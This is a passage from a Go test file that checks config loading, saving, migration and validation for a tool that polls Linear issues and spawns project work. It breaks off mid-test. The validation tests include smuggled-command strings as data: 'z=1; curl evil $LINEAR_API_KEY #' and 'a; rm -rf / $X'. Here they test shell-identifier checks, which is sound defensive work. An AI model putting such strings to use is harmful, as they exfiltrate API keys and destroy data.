package config

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/sushidev-team/lola/internal/notify"
)

func validProject() Project {
	return Project{
		Name:          "nori-app",
		Path:          "/Volumes/Git/sushi/internal/nori/nori-app",
		Repo:          "sushidev-team/nori-app",
		DefaultBranch: "main",
		PostCreate:    []string{"composer install", "bun install --frozen-lockfile"},
		Symlinks:      []string{".env"},
		Env:           map[string]string{"APP_ENV": "local", "CI": "1"},
	}
}

// validPoll returns a valid POLLING project — the merged model: a project with
// Linear polling configured on it. Used where tests exercise polling config.
func validPoll() Project {
	p := validProject()
	p.Enabled = true
	p.TeamID = "team-uuid"
	p.ProjectID = "proj-uuid"
	p.CycleMode = "active"
	p.StateIDs = []string{"state-1", "state-2"}
	p.MatchLabels = []string{"label-1"}
	p.MatchMode = "any"
	p.AssigneeMode = "me"
	p.ConcurrencyCap = 2
	p.PrioritySort = []string{"priority", "createdAt"}
	p.DedupMode = "label"
	p.OnSentSetLabel = "label-sent"
	return p
}

func TestHomeEnvOverride(t *testing.T) {
	t.Setenv("LOLA_HOME", "/tmp/lola-test-home")
	h, err := Home()
	if err != nil {
		t.Fatal(err)
	}
	if h != "/tmp/lola-test-home" {
		t.Fatalf("Home() = %q, want LOLA_HOME override", h)
	}

	p, err := DefaultPath()
	if err != nil {
		t.Fatal(err)
	}
	if p != filepath.Join("/tmp/lola-test-home", "config.toml") {
		t.Fatalf("DefaultPath() = %q", p)
	}

	t.Setenv("LOLA_HOME", "")
	h, err = Home()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasSuffix(h, string(filepath.Separator)+".lola") {
		t.Fatalf("Home() without LOLA_HOME = %q, want ~/.lola", h)
	}
}

func TestLoadMissingFileGivesDefaults(t *testing.T) {
	c, err := Load(filepath.Join(t.TempDir(), "nope", "config.toml"))
	if err != nil {
		t.Fatalf("missing file must not error, got %v", err)
	}
	if c.Linear.Endpoint != DefaultEndpoint {
		t.Errorf("endpoint = %q", c.Linear.Endpoint)
	}
	if c.Defaults.PollInterval != DefaultPollInterval {
		t.Errorf("poll interval = %v", c.Defaults.PollInterval)
	}
}

func TestAutoManageDaemonDefaultsTrue(t *testing.T) {
	// Unset (nil pointer) resolves to self-managed.
	c, err := Load(filepath.Join(t.TempDir(), "config.toml"))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if !c.AutoManageDaemon() {
		t.Error("unset manage_daemon should default to true (self-managed)")
	}

	f := false
	c.Defaults.ManageDaemon = &f
	if c.AutoManageDaemon() {
		t.Error("manage_daemon=false should disable self-management")
	}
	tr := true
	c.Defaults.ManageDaemon = &tr
	if !c.AutoManageDaemon() {
		t.Error("manage_daemon=true should enable self-management")
	}
}

func TestManageDaemonRoundTrip(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "config.toml")
	f := false
	orig := &Config{}
	orig.Defaults.ManageDaemon = &f
	if err := orig.Save(path); err != nil {
		t.Fatalf("save: %v", err)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if got.Defaults.ManageDaemon == nil || *got.Defaults.ManageDaemon {
		t.Errorf("manage_daemon did not round-trip false, got %v", got.Defaults.ManageDaemon)
	}
	if got.AutoManageDaemon() {
		t.Error("round-tripped manage_daemon=false should keep self-management off")
	}
}

func TestSaveLoadRoundTrip(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "sub", "config.toml")

	orig := &Config{}
	orig.Defaults.PollInterval = 90 * time.Second
	orig.Defaults.ConcurrencyCap = 3
	orig.Defaults.GlobalCap = 5
	orig.Linear = LinearConfig{APIKeyKeychain: "lola-linear", APIKeyEnv: "LINEAR_API_KEY", Endpoint: DefaultEndpoint}
	orig.Projects = []Project{validPoll()} // one polling project
	// Resolved reaction/notify/tmux tables round-trip exactly; a load always
	// materializes them, so a round-tripped config carries the defaults.
	orig.Reactions = defaultReactions()
	orig.Notify = defaultNotify()
	orig.Tmux = defaultTmux()

	if err := orig.Save(path); err != nil {
		t.Fatal(err)
	}

	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Errorf("config mode = %v, want 0600", info.Mode().Perm())
	}
	dirInfo, err := os.Stat(filepath.Dir(path))
	if err != nil {
		t.Fatal(err)
	}
	if dirInfo.Mode().Perm() != 0o700 {
		t.Errorf("dir mode = %v, want 0700", dirInfo.Mode().Perm())
	}

	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(orig, got) {
		t.Errorf("round trip mismatch:\n save: %+v\n load: %+v", orig, got)
	}

	// [ui] is deliberately NOT in the materialized-defaults club above: it
	// resolves to the ZERO value and its default lives in UITheme(), which is
	// what keeps an unconfigured [ui] out of the saved file. Hence no
	// orig.UI = ... seed is needed for the DeepEqual to hold.
	if got.UI != (UIConfig{}) {
		t.Errorf("round-tripped UI = %+v, want the zero UIConfig", got.UI)
	}
	if got.UITheme() != DefaultUITheme {
		t.Errorf("round-tripped UITheme() = %q, want %q", got.UITheme(), DefaultUITheme)
	}

	// No leftover temp files from the atomic write.
	entries, err := os.ReadDir(filepath.Dir(path))
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 1 {
		t.Errorf("expected only config.toml in dir, got %d entries", len(entries))
	}
}

// A pre-Kind config with top-level [[poll]] loads, then the first Save migrates
// it in place to nested [[project.poll]] with no top-level [[poll]] left, and a
// reload is identical — zero-loss, lazy migration.
func TestMigrateLegacyPollOntoProject(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "config.toml")
	old := `
[defaults]
global_cap = 5

[[project]]
name = "nori"
path = "/srv/nori"

[[poll]]
name = "triage"
project = "nori"
team_id = "t1"
match_mode = "any"
assignee_mode = "anyone"
cycle_mode = "none"
dedup_mode = "seen"
concurrency_cap = 1
`
	if err := os.WriteFile(path, []byte(old), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	// The legacy [[poll]] folds onto its project: nori now polls.
	nori := c.ProjectByName("nori")
	if nori == nil || !nori.Polls() || nori.TeamID != "t1" {
		t.Fatalf("legacy poll not folded onto project: %+v", nori)
	}

	// Save migrates in place: inline polling fields, no [[poll]] table.
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	raw, _ := os.ReadFile(path)
	s := string(raw)
	if strings.Contains(s, "[[poll]]") || strings.Contains(s, "[[project.poll]]") {
		t.Errorf("Save should drop the legacy poll table:\n%s", s)
	}
	if !strings.Contains(s, `team_id = "t1"`) {
		t.Errorf("Save should write the polling fields inline on the project:\n%s", s)
	}

	c2, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(c.Projects, c2.Projects) {
		t.Errorf("reload after migration mismatch:\n before: %+v\n after:  %+v", c.Projects, c2.Projects)
	}
}

// A legacy [[poll]] whose project does not resolve is surfaced by Validate.
func TestLegacyPollUnknownProjectFailsValidate(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := `
[defaults]
global_cap = 5

[[project]]
name = "nori"
path = "/srv/nori"

[[poll]]
name = "ghostpoll"
project = "ghost"
team_id = "t1"
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if err := c.Validate(); err == nil || !strings.Contains(err.Error(), "ghost") {
		t.Errorf("a legacy poll referencing an undefined project must fail Validate, got: %v", err)
	}
}

// More than one poll for a project is rejected (a project has at most one).
func TestMultiplePollsForProjectRejected(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := `
[defaults]
global_cap = 5

[[project]]
name = "nori"
path = "/srv/nori"

[[project.poll]]
name = "a"
team_id = "t1"

[[project.poll]]
name = "b"
team_id = "t1"
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if err := c.Validate(); err == nil || !strings.Contains(err.Error(), "at most one") {
		t.Errorf("two polls for one project must fail Validate, got: %v", err)
	}
}

func TestBranchPrefixForProject(t *testing.T) {
	c := &Config{Projects: []Project{
		{Name: "def", Path: "/d"},
		{Name: "custom", Path: "/c", BranchPrefix: "feat/"},
	}}
	if got := c.BranchPrefixForProject("def"); got != DefaultBranchPrefix {
		t.Errorf("unset prefix = %q, want %q", got, DefaultBranchPrefix)
	}
	if got := c.BranchPrefixForProject("custom"); got != "feat/" {
		t.Errorf("custom prefix = %q, want feat/", got)
	}
	if got := c.BranchPrefixForProject("nope"); got != DefaultBranchPrefix {
		t.Errorf("unknown project prefix = %q, want default %q", got, DefaultBranchPrefix)
	}
}

func TestLoadClampAndEndpointDefault(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := `
[defaults]
poll_interval = "10s"
concurrency_cap = 1
global_cap = 4
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if c.Defaults.PollInterval != MinPollInterval {
		t.Errorf("poll interval = %v, want clamped %v", c.Defaults.PollInterval, MinPollInterval)
	}
	if c.Linear.Endpoint != DefaultEndpoint {
		t.Errorf("endpoint = %q, want default", c.Linear.Endpoint)
	}
}

// Projects get default_branch = "main" and a tilde-expanded path on load. Keys
// from the AO-bridge era (per-poll `runtime` / `ao_project`) are silently
// ignored so pre-migration configs still load; the `project` reference remains.
func TestLoadProjectDefaultsAndLegacyKeysIgnored(t *testing.T) {
	home, err := os.UserHomeDir()
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "config.toml")
	body := `
[[project]]
name = "nori-app"
path = "~/code/nori-app"

[[project]]
name = "pinned"
path = "/srv/pinned"
default_branch = "develop"

[[poll]]
name = "legacy-poll"
runtime = "ao"
ao_project = "frontend"

[[poll]]
name = "native-poll"
runtime = "native"
project = "nori-app"
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}

	if want := filepath.Join(home, "code", "nori-app"); c.Projects[0].Path != want {
		t.Errorf("project path = %q, want expanded %q", c.Projects[0].Path, want)
	}
	if c.Projects[0].DefaultBranch != DefaultBranchName {
		t.Errorf("default_branch = %q, want default %q", c.Projects[0].DefaultBranch, DefaultBranchName)
	}
	if c.Projects[1].DefaultBranch != "develop" {
		t.Errorf("explicit default_branch = %q, want develop", c.Projects[1].DefaultBranch)
	}
	// The native [[poll]] folded onto its project; the AO-era keys are ignored.
	if c.ProjectByName("nori-app") == nil {
		t.Error("nori-app project must load")
	}
}

// The projects table round-trips including post_create, symlinks, and the
// env map — nested tables under [[project]] must survive Save/Load.
func TestProjectRoundTripEnvMap(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	orig := &Config{}
	orig.applyDefaults()
	orig.Projects = []Project{validProject()}
	if err := orig.Save(path); err != nil {
		t.Fatal(err)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(orig.Projects, got.Projects) {
		t.Errorf("projects round trip mismatch:\n save: %+v\n load: %+v", orig.Projects, got.Projects)
	}
}

func TestLoadPollIntervalClampBoundaries(t *testing.T) {
	cases := []struct {
		name string
		toml string // poll_interval line, or "" for unset
		want time.Duration
	}{
		{"below min clamps up", `poll_interval = "10s"`, MinPollInterval},
		{"exactly min unchanged", `poll_interval = "30s"`, MinPollInterval},
		{"above min unchanged", `poll_interval = "45s"`, 45 * time.Second},
		{"negative clamps up", `poll_interval = "-5s"`, MinPollInterval},
		{"unset gets default", ``, DefaultPollInterval},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "config.toml")
			body := "[defaults]\n" + tc.toml + "\n"
			if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
				t.Fatal(err)
			}
			c, err := Load(path)
			if err != nil {
				t.Fatal(err)
			}
			if c.Defaults.PollInterval != tc.want {
				t.Errorf("poll interval = %v, want %v", c.Defaults.PollInterval, tc.want)
			}
		})
	}
}

func TestLoadRejectsMalformedFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")

	if err := os.WriteFile(path, []byte("[defaults\nnot toml"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(path); err == nil {
		t.Error("malformed TOML must error")
	} else if !strings.Contains(err.Error(), path) {
		t.Errorf("parse error should name the file, got: %v", err)
	}

	if err := os.WriteFile(path, []byte("[defaults]\npoll_interval = \"soon\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(path); err == nil {
		t.Error("unparseable poll_interval must error")
	}
}

func TestSaveDurationFormatOnDisk(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	c := &Config{}
	c.Defaults.PollInterval = 90 * time.Second
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	// On disk the interval is a Go duration string, not an integer.
	if !strings.Contains(string(data), `poll_interval = "1m30s"`) {
		t.Errorf("saved file should contain poll_interval = \"1m30s\", got:\n%s", data)
	}
}

func TestSaveOverwriteKeepsModeAndContent(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")

	c1 := &Config{}
	c1.Defaults.GlobalCap = 1
	if err := c1.Save(path); err != nil {
		t.Fatal(err)
	}

	c2 := &Config{}
	c2.Defaults.GlobalCap = 9
	if err := c2.Save(path); err != nil {
		t.Fatal(err)
	}

	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Errorf("mode after overwrite = %v, want 0600", info.Mode().Perm())
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if got.Defaults.GlobalCap != 9 {
		t.Errorf("global_cap = %d, want overwritten value 9", got.Defaults.GlobalCap)
	}
	entries, err := os.ReadDir(filepath.Dir(path))
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 1 {
		t.Errorf("temp files left behind after overwrite: %d entries", len(entries))
	}
}

func TestValidate(t *testing.T) {
	c := &Config{}
	c.Defaults.GlobalCap = 4
	c.Projects = []Project{validPoll()} // one polling project
	if err := c.Validate(); err != nil {
		t.Fatalf("valid config rejected: %v", err)
	}

	// Fallback cap from defaults.
	c.Projects[0].ConcurrencyCap = 0
	c.Defaults.ConcurrencyCap = 2
	if err := c.Validate(); err != nil {
		t.Fatalf("defaults.concurrency_cap fallback rejected: %v", err)
	}
	if got := c.EffectiveCap(&c.Projects[0]); got != 2 {
		t.Errorf("EffectiveCap = %d, want 2", got)
	}

	// Invalid polling config on projects (plus a duplicate name and no global cap).
	bad := &Config{}
	bad.Projects = []Project{
		{Name: "", Path: "/x", TeamID: "t", CycleMode: "pinned", MatchMode: "some", AssigneeMode: "user", DedupMode: "label"},
		{Name: "dup", Path: "/y", TeamID: "t", CycleMode: "none", MatchMode: "all", AssigneeMode: "anyone", DedupMode: "seen", ConcurrencyCap: 1},
		{Name: "dup", Path: "/z", TeamID: "t", CycleMode: "none", MatchMode: "all", AssigneeMode: "anyone", DedupMode: "seen", ConcurrencyCap: 1},
	}
	err := bad.Validate()
	if err == nil {
		t.Fatal("invalid config accepted")
	}
	msg := err.Error()
	for _, want := range []string{
		"global_cap",
		"name is required",
		"cycle_mode=pinned requires cycle_id",
		"match_mode",
		"assignee_mode=user requires assignee_user_id",
		"on_sent_set_label",
		"concurrency_cap",
		"duplicate name",
	} {
		if !strings.Contains(msg, want) {
			t.Errorf("Validate() error missing %q in:\n%s", want, msg)
		}
	}
}

// TestValidateMatrix exercises every Validate rule in isolation: each case
// mutates one aspect of a known-good config and asserts the specific error
// (or that the config remains valid).
func TestValidateMatrix(t *testing.T) {
	valid := func() *Config {
		c := &Config{}
		c.Defaults.GlobalCap = 4
		c.Projects = []Project{validPoll()} // one polling project
		return c
	}

	cases := []struct {
		name    string
		mutate  func(c *Config)
		wantErr string // substring of Validate() error; "" = must be valid
	}{
		{"valid config passes", func(c *Config) {}, ""},
		{"no polling still needs global cap", func(c *Config) { c.Projects = []Project{validProject()}; c.Defaults.GlobalCap = 0 }, "global_cap"},
		{"global cap zero", func(c *Config) { c.Defaults.GlobalCap = 0 }, "global_cap"},
		{"global cap negative", func(c *Config) { c.Defaults.GlobalCap = -1 }, "global_cap"},

		{"name required", func(c *Config) { c.Projects[0].Name = "" }, "name is required"},
		{"duplicate names rejected", func(c *Config) { c.Projects = append(c.Projects, c.Projects[0]) }, "duplicate name"},
		{"no team means no polling (valid)", func(c *Config) { c.Projects[0].TeamID = "" }, ""},

		{"cycle_mode none ok", func(c *Config) { c.Projects[0].CycleMode = "none" }, ""},
		{"cycle_mode active ok", func(c *Config) { c.Projects[0].CycleMode = "active" }, ""},
		{"pinned requires cycle_id", func(c *Config) { c.Projects[0].CycleMode = "pinned"; c.Projects[0].CycleID = "" }, "cycle_mode=pinned requires cycle_id"},
		{"pinned with cycle_id ok", func(c *Config) { c.Projects[0].CycleMode = "pinned"; c.Projects[0].CycleID = "cyc-1" }, ""},
		{"bad cycle_mode enum", func(c *Config) { c.Projects[0].CycleMode = "weekly" }, "cycle_mode"},
		{"empty cycle_mode rejected", func(c *Config) { c.Projects[0].CycleMode = "" }, "cycle_mode"},

		{"match_mode any ok", func(c *Config) { c.Projects[0].MatchMode = "any" }, ""},
		{"match_mode all ok", func(c *Config) { c.Projects[0].MatchMode = "all" }, ""},
		{"bad match_mode enum", func(c *Config) { c.Projects[0].MatchMode = "some" }, "match_mode"},
		{"empty match_mode rejected", func(c *Config) { c.Projects[0].MatchMode = "" }, "match_mode"},

		{"assignee anyone ok", func(c *Config) { c.Projects[0].AssigneeMode = "anyone" }, ""},
		{"assignee user requires id", func(c *Config) { c.Projects[0].AssigneeMode = "user"; c.Projects[0].AssigneeUserID = "" }, "assignee_mode=user requires assignee_user_id"},
		{"assignee user with id ok", func(c *Config) { c.Projects[0].AssigneeMode = "user"; c.Projects[0].AssigneeUserID = "u-1" }, ""},
		{"bad assignee_mode enum", func(c *Config) { c.Projects[0].AssigneeMode = "nobody" }, "assignee_mode"},
		{"empty assignee_mode rejected", func(c *Config) { c.Projects[0].AssigneeMode = "" }, "assignee_mode"},

		{"repo empty ok (falls back to project repo)", func(c *Config) { c.Projects[0].Repo = "" }, ""},
		{"repo owner/name ok", func(c *Config) { c.Projects[0].Repo = "sushidev-team/nori-app" }, ""},
		{"repo dots underscores dashes ok", func(c *Config) { c.Projects[0].Repo = "My-Org.x/repo_name.js" }, ""},
		{"repo without owner rejected", func(c *Config) { c.Projects[0].Repo = "nori-app" }, `repo must be "owner/name"`},
		{"repo url rejected", func(c *Config) { c.Projects[0].Repo = "https://github.com/sushidev-team/nori-app" }, `repo must be "owner/name"`},
		{"repo extra path segment rejected", func(c *Config) { c.Projects[0].Repo = "a/b/c" }, `repo must be "owner/name"`},
		{"repo embedded space rejected", func(c *Config) { c.Projects[0].Repo = "owner/na me" }, `repo must be "owner/name"`},

		{"label mode needs set label", func(c *Config) { c.Projects[0].OnSentSetLabel = "" }, "on_sent_set_label"},
		{"label mode needs match labels", func(c *Config) { c.Projects[0].MatchLabels = nil }, "requires match_labels"},
		{"label mode set label must not be a match label", func(c *Config) {
			c.Projects[0].OnSentSetLabel = "label-1"
		}, "on_sent_set_label must not be one of match_labels"},
		{"label mode any with multiple match labels ok", func(c *Config) {
			c.Projects[0].MatchMode = "any"
			c.Projects[0].MatchLabels = []string{"label-1", "label-2"}
		}, ""},
		{"label mode all with multiple match labels ok", func(c *Config) {
			c.Projects[0].MatchMode = "all"
			c.Projects[0].MatchLabels = []string{"label-1", "label-2"}
		}, ""},
		{"seen mode multiple any labels ok", func(c *Config) {
			c.Projects[0].DedupMode = "seen"
			c.Projects[0].OnSentSetLabel = ""
			c.Projects[0].MatchMode = "any"
			c.Projects[0].MatchLabels = []string{"label-1", "label-2"}
		}, ""},
		{"seen mode needs no labels", func(c *Config) {
			c.Projects[0].DedupMode = "seen"
			c.Projects[0].OnSentSetLabel = ""
		}, ""},
		{"bad dedup_mode enum", func(c *Config) { c.Projects[0].DedupMode = "both" }, "dedup_mode"},
		{"empty dedup_mode rejected", func(c *Config) { c.Projects[0].DedupMode = "" }, "dedup_mode"},

		// dedup_mode=state (P4): dedups by moving the issue OUT of state_ids on
		// spawn. Requires state_ids set and on_spawn_state_id set to a state that
		// is NOT one of state_ids.
		{"state mode valid", func(c *Config) {
			c.Projects[0].DedupMode = "state"
			c.Projects[0].OnSpawnStateID = "state-inprogress" // not in validPoll's state_ids
		}, ""},
		{"state mode requires spawn state", func(c *Config) {
			c.Projects[0].DedupMode = "state"
			c.Projects[0].OnSpawnStateID = ""
		}, "dedup_mode=state requires on_spawn_state_id"},
		{"state mode spawn state must not be a match state", func(c *Config) {
			c.Projects[0].DedupMode = "state"
			c.Projects[0].OnSpawnStateID = "state-1" // one of validPoll's state_ids
		}, "on_spawn_state_id must not be one of state_ids"},
		{"state mode requires state_ids", func(c *Config) {
			c.Projects[0].DedupMode = "state"
			c.Projects[0].OnSpawnStateID = "state-inprogress"
			c.Projects[0].StateIDs = nil
		}, "dedup_mode=state requires state_ids"},
		{"write-back fields coexist with label dedup", func(c *Config) {
			c.Projects[0].OnPRStateID = "state-review"
			c.Projects[0].OnMergedStateID = "state-done"
			c.Projects[0].BlockedLabelID = "label-blocked"
			c.Projects[0].CommentOnPR = true
		}, ""},

		{"cap zero without default", func(c *Config) { c.Projects[0].ConcurrencyCap = 0 }, "concurrency_cap"},
		{"cap negative without default", func(c *Config) { c.Projects[0].ConcurrencyCap = -2 }, "concurrency_cap"},
		{"cap zero with default ok", func(c *Config) { c.Projects[0].ConcurrencyCap = 0; c.Defaults.ConcurrencyCap = 2 }, ""},

		{"project valid ok", func(c *Config) { c.Projects = []Project{validProject()} }, ""},
		{"project name required", func(c *Config) {
			p := validProject()
			p.Name = ""
			c.Projects = []Project{p}
		}, "project[0]: name is required"},
		{"duplicate project names rejected", func(c *Config) {
			c.Projects = []Project{validProject(), validProject()}
		}, `project "nori-app": duplicate name`},
		{"project path required", func(c *Config) {
			p := validProject()
			p.Path = ""
			c.Projects = []Project{p}
		}, "path is required"},
		{"project repo empty ok", func(c *Config) {
			p := validProject()
			p.Repo = ""
			c.Projects = []Project{p}
		}, ""},
		{"project repo url rejected", func(c *Config) {
			p := validProject()
			p.Repo = "https://github.com/sushidev-team/nori-app"
			c.Projects = []Project{p}
		}, `project "nori-app": repo must be "owner/name"`},
		{"non-polling project still validated", func(c *Config) {
			p := validProject() // no polling
			p.Path = ""
			c.Projects = []Project{p}
		}, "path is required"},

		// env keys become NAME= assignments in a shell-sourced file at spawn
		// time, so they must be POSIX shell identifiers — a name carrying shell
		// metacharacters is a Linear-API-key exfiltration vector.
		{"project env plain identifier ok", func(c *Config) {
			p := validProject()
			p.Env = map[string]string{"APP_ENV": "local"}
			c.Projects = []Project{p}
		}, ""},
		{"project env value may hold anything", func(c *Config) {
			p := validProject()
			p.Env = map[string]string{"APP_ENV": "a; rm -rf / $X"}
			c.Projects = []Project{p}
		}, ""},
		{"project env name with shell metachars rejected", func(c *Config) {
			p := validProject()
			p.Env = map[string]string{"z=1; curl evil $LINEAR_API_KEY #": "x"}
			c.Projects = []Project{p}
		}, "is not a valid shell identifier"},
		{"project env name starting with digit rejected", func(c *Config) {
			p := validProject()
			p.Env = map[string]string{"1BAD": "x"}
			c.Projects = []Project{p}
		}, "is not a valid shell identifier"},
		{"project env name with dash rejected", func(c *Config) {
			p := validProject()
			p.Env = map[string]string{"has-dash": "x"}
			c.Projects = []Project{p}
		}, "is not a valid shell identifier"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := valid()
			tc.mutate(c)
			err := c.Validate()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("want valid, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("want error containing %q, got nil", tc.wantErr)
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("error missing %q:\n%v", tc.wantErr, err)
			}
		})
	}
}

func TestEffectiveCapFallback(t *testing.T) {
	c := &Config{}
	c.Defaults.ConcurrencyCap = 3

	p := validPoll()
	p.ConcurrencyCap = 5
	if got := c.EffectiveCap(&p); got != 5 {
		t.Errorf("poll cap set: EffectiveCap = %d, want 5", got)
	}

	p.ConcurrencyCap = 0
	if got := c.EffectiveCap(&p); got != 3 {
		t.Errorf("poll cap unset: EffectiveCap = %d, want defaults fallback 3", got)
	}

	// Negative poll caps are not a valid override; fall back to defaults.
	p.ConcurrencyCap = -1
	if got := c.EffectiveCap(&p); got != 3 {
		t.Errorf("poll cap negative: EffectiveCap = %d, want defaults fallback 3", got)
	}

	if got := c.EffectiveCap(nil); got != 3 {
		t.Errorf("nil poll: EffectiveCap = %d, want defaults fallback 3", got)
	}
}

// PollRepo resolves the PR-check repo: the project's own repo, else empty.
func TestPollRepo(t *testing.T) {
	c := &Config{}
	p := &Project{Name: "nori-app", Repo: "sushidev-team/nori-app"}
	if got := c.PollRepo(p); got != "sushidev-team/nori-app" {
		t.Errorf("PollRepo = %q, want the project's repo", got)
	}
	p.Repo = ""
	if got := c.PollRepo(p); got != "" {
		t.Errorf("PollRepo = %q, want empty", got)
	}
	if got := c.PollRepo(nil); got != "" {
		t.Errorf("PollRepo(nil) = %q, want empty", got)
	}
}

func TestPollByName(t *testing.T) {
	c := &Config{Projects: []Project{validPoll()}} // named "nori-app"
	p := c.PollByName("nori-app")
	if p == nil {
		t.Fatal("PollByName returned nil for an existing polling project")
	}
	p.Enabled = false
	if c.Projects[0].Enabled {
		t.Error("PollByName must return a pointer into Projects")
	}
	if c.PollByName("missing") != nil {
		t.Error("PollByName must return nil for unknown name")
	}
}

func TestProjectByName(t *testing.T) {
	c := &Config{Projects: []Project{validProject()}}
	p := c.ProjectByName("nori-app")
	if p == nil {
		t.Fatal("ProjectByName returned nil for existing project")
	}
	p.DefaultBranch = "develop"
	if c.Projects[0].DefaultBranch != "develop" {
		t.Error("ProjectByName must return a pointer into Projects")
	}
	if c.ProjectByName("missing") != nil {
		t.Error("ProjectByName must return nil for unknown name")
	}
}

// The shipped example config must always load and validate cleanly, and every
// poll references a [[project]] (the native runtime's registry).
func TestExampleConfigLoadsAndValidates(t *testing.T) {
	c, err := Load(filepath.Join("..", "..", "config.example.toml"))
	if err != nil {
		t.Fatal(err)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("config.example.toml does not validate: %v", err)
	}
	if c.ProjectByName("nori-app") == nil {
		t.Error("example config should define project nori-app")
	}
	for _, p := range c.PollingProjects() {
		if p.TeamID == "" {
			t.Errorf("polling project %q must have a team", p.Name)
		}
	}
}

// When neither [reactions] nor [notify] is present, load materializes the full
// defaults — existing configs keep working, now with a reaction/notify policy.
func TestReactionsNotifyDefaultsWhenTablesAbsent(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := "[defaults]\nglobal_cap = 4\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(c.Reactions, defaultReactions()) {
		t.Errorf("reactions = %+v, want defaults %+v", c.Reactions, defaultReactions())
	}
	if c.Notify.Desktop != defaultDesktop() {
		t.Errorf("notify.desktop = %v, want default %v", c.Notify.Desktop, defaultDesktop())
	}
	if c.Notify.SlackWebhookEnv != DefaultSlackWebhookEnv {
		t.Errorf("notify.slack_webhook_env = %q, want %q", c.Notify.SlackWebhookEnv, DefaultSlackWebhookEnv)
	}
	if !reflect.DeepEqual(c.Notify.Routing, defaultRouting()) {
		t.Errorf("notify.routing = %v, want default %v", c.Notify.Routing, defaultRouting())
	}
	if err := c.Validate(); err != nil {
		t.Errorf("defaulted reactions/notify must validate: %v", err)
	}
}

// Explicitly-set reaction fields — including the disabling zeros auto=false and
// retries=0 — survive load; unset reactions/priorities still take defaults.
func TestReactionsNotifyExplicitValuesKept(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := `
[defaults]
global_cap = 4

[reactions.ci_failed]
auto = false
retries = 0
message = "hand-rolled recovery"

[reactions.merged]
auto = false

[notify]
desktop = false
slack_webhook_env = "MY_HOOK"

[notify.routing]
urgent = ["slack"]
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}

	// ci_failed: every field explicit — the disabling zeros must NOT revert to
	// the {auto:true, retries:2} defaults.
	if got, want := c.Reactions.CIFailed, (Reaction{Auto: false, Retries: 0, Message: "hand-rolled recovery"}); got != want {
		t.Errorf("ci_failed = %+v, want %+v (explicit zeros kept)", got, want)
	}
	// merged: only auto set explicitly to false; the rest stays default.
	if got, want := c.Reactions.Merged, (Reaction{Auto: false}); got != want {
		t.Errorf("merged = %+v, want %+v", got, want)
	}
	// changes_requested: table absent → full default.
	if got, want := c.Reactions.ChangesRequested, defaultReactions().ChangesRequested; got != want {
		t.Errorf("changes_requested = %+v, want default %+v", got, want)
	}

	if c.Notify.Desktop {
		t.Error("notify.desktop = true, want explicit false kept (even where default is true)")
	}
	if c.Notify.SlackWebhookEnv != "MY_HOOK" {
		t.Errorf("notify.slack_webhook_env = %q, want MY_HOOK", c.Notify.SlackWebhookEnv)
	}
	if got := c.Notify.Routing["urgent"]; !reflect.DeepEqual(got, []string{"slack"}) {
		t.Errorf("routing.urgent = %v, want overridden [slack]", got)
